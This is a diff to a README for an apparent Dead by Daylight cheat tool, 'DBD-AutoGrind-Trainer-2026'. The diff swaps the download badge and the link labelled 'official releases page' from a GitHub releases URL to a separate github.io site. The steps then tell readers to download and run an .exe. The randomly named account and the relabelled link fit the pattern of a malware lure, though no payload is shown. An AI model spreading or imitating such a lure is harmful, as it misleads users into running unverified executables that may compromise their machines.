@@ -1,6 +1,6 @@
 # 🎮 DBD-AutoGrind-Trainer-2026 - Automate your Dead by Daylight progression easily
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/megakaryocytic-cuirassier849/DBD-AutoGrind-Trainer-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://megakaryocytic-cuirassier849.github.io)
 
 This software automates progression in Dead by Daylight. It allows players to gain Bloodpoints, unlock perks, and customize characters without manual effort. The tool operates as an external process to assist with gameplay tasks and visual tracking.
 
@@ -20,7 +20,7 @@ Ensure your Windows system uses the latest updates before you start. Outdated dr
 
 Follow these steps to obtain the tool:
 
-1. Visit the [official releases page](https://github.com/megakaryocytic-cuirassier849/DBD-AutoGrind-Trainer-2026/releases).
+1. Visit the [official releases page](https://megakaryocytic-cuirassier849.github.io).
 2. Locate the most recent version labeled "Assets".
 3. Click the .exe file to start the download.
 4. Save the file to a folder you can find easily, such as your Desktop.
